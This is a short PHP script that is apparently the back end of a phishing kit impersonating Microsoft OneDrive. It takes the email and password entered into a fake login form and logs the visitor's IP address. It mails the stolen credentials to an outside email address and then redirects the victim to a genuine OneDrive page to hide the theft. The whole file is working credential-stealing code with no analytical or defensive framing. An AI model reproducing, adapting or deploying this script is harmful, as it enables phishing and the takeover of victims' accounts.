<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------OneDrive All in One-------------------------\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------CreateD bY MaJoritY BoYs---------------------\n";

$send = "zswaggerlee@protonmail.com";

$subject = "OneDrive Single";
$headers = "From: OneDrive Single";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://onedrive.live.com/?authkey=%21AFz63DNmfUGL23Y&cid=8A9CD1D10BF75D0C&id=8A9CD1D10BF75D0C%21124&parId=root&o=OneUp");
	  

?>